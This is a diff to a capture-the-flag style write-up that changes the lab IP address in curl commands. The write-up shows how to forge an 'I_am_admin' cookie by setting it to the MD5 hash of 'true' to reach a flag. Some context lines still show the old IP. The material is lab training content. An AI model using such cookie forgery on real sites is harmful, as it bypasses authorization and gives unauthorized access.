@@ -1,6 +1,6 @@
 # Cookies
 
-__curl -v -s 'http://192.168.99.101' -o out.file__
+__curl -v -s 'http://192.168.56.101' -o out.file__
 
 ## Description
 The command can send to url cookies.
@@ -8,7 +8,7 @@ The command can send to url cookies.
 ## Form Outputs
 Then we get the following output.
 ```
-* Rebuilt URL to: http://192.168.99.101/
+* Rebuilt URL to: http://192.168.56.101/
 *   Trying 192.168.99.101...
 * TCP_NODELAY set
 * Connected to 192.168.99.101 (192.168.99.101) port 80 (#0)
@@ -35,8 +35,8 @@ Let's convert [I_am_admit](#https://md5.gromweb.com/?md5=68934a3e9455fa72420237e
 So what about __true__ ```echo -n 'true' | md5``` -> 'b326b5062b2f0e69046810717534cb09'
 When we compare the outputs with cookies true and false weget the next flag.
 ```
-curl -s 'http://192.168.99.101' -o false.html
-curl -s --cookie I_am_admin=$(echo -n 'true' | md5) 'http://192.168.99.101' -o true.html 
+curl -s 'http://192.168.56.101' -o false.html
+curl -s --cookie I_am_admin=$(echo -n 'true' | md5) 'http://192.168.56.101' -o true.html 
 diff false.html true.html 
 ```
 
